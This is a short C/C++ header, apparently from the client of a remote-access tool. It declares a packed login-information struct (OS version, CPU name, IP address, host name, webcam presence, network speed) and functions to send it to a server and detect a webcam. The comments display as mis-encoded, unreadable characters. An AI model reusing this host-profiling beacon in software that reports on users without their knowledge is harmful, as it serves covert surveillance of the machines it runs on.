#pragma once

#include<winternl.h>
#include<ntstatus.h>
#include"_IOCPClient.h"
#include"Common.h"
#include<Vfw.h>
#pragma comment(lib,"Vfw32.lib")

#pragma pack(1)
typedef  struct  _LOGIN_INFORMATION_
{
	BYTE   IsToken;                                       //��Ϣͷ��
	OSVERSIONINFOEX    OsVersionInfoEx;                  //�汾��Ϣ
	char      ProcessorNameString[MAX_PATH];             //CPU��Ƶ
	IN_ADDR          ClientAddress;                      //�洢32λ��IPv4�ĵ�ַ�����ݽṹ
	char             HostName[MAX_PATH];                 //������
	BOOL             IsWebCameraExist;                   //�Ƿ�������ͷ
	DWORD            WebSpeed;                           //����
}LOGIN_INFORMATION, *PLOGIN_INFORMATION;


int  SendLoginInformation(_CIOCPClient*  IOCPClient, DWORD   WedSpeed);
//��ȡCPU�ͺ�
NTSTATUS  GetProcessNameString(char* ProcessorNameString, ULONG* ProcessoeNameStringLength);
//�ж���������ͷ
BOOL      IsWebCamera();